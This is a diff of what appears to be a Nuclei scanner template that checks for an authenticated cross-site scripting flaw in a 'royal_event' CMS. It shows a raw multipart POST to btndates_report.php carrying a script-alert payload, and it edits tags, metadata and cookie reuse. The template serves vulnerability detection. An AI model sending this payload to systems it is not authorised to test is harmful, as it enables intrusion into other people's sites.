@@ -15,8 +15,7 @@ info:
     cwe-id: CWE-79
   metadata:
     verified: true
-    max-request: 2
-  tags: cms,royalevent,packetstorm,xss,authenticated,intrusive,vuln
+  tags: cms,royalevent,packetstorm,xss,authenticated
 
 http:
   - raw:
@@ -38,6 +37,7 @@ http:
         Content-Disposition: form-data; name="login"
 
         ------WebKitFormBoundaryCSxQll1eihcqgIgD--
+
       - |
         POST /royal_event/btndates_report.php HTTP/1.1
         Host: {{Hostname}}
@@ -57,6 +57,7 @@ http:
         2022-06-22<script>alert(document.domain)</script>
         ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
 
+    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -73,4 +74,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 4a0a00473045022071fc233c7a6752966e325780da1ab723e71bf0ab322f474a6011fe0377173af0022100eca877fdf3c7e778edc67eb85a85603ff5ba662166211dbf0593f7bc35c20533:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/09/23
